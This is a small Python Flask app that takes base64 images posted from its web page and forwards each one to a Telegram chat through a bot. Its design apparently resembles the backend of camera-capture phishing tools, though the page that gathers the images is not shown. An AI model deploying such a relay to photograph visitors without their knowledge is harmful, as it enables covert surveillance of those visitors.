import os
import telebot
from flask import Flask, render_template, request
import base64

app = Flask(__name__)
# Render'daki şifreleri alıyoruz
TOKEN = os.environ.get("TOKEN")
CHAT_ID = os.environ.get("CHAT_ID")
bot = telebot.TeleBot(TOKEN)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/foto-gonder', methods=['POST'])
def foto_gonder():
    data = request.json
    if 'image' in data:
        # Gelen base64 fotoğraf verisini çöz
        image_data = data['image'].split(',')[1]
        image_bytes = base64.b64decode(image_data)
        
        # Telegram'dan sana fotoğraf olarak at
        try:
            bot.send_photo(CHAT_ID, image_bytes, caption="📸 Siteden yeni bir fotoğraf geldi!")
        except Exception as e:
            print("Telegram hatası:", e)
            
    return "OK", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
